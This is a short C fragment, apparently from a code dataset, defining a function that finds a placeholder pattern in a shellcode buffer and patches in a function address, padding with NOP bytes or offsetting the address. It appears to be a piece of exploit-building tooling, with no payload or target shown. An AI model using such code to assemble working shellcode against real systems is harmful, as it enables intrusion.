
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int DWORD ;


 int memcpy (unsigned char*,int*,int) ;
 unsigned char* strstr (char*,char*) ;

void EncodeFuncAddr(char * shellcode,DWORD addr,char * pattern)
{
 unsigned char * p ;
 p = strstr(shellcode,pattern);
 if(p) {
  if( *(p+4) == '\xFF' )
   memcpy(p,&addr,4);
  else {
   if((addr & 0xFF) > 0x80) {
    memcpy(p,&addr,4);
    *(p+4) = 0x90;
    *(p+5) = 0x90;
   }else {
    addr += 0x78;
    memcpy(p,&addr,4);
   }
  }
 }
}
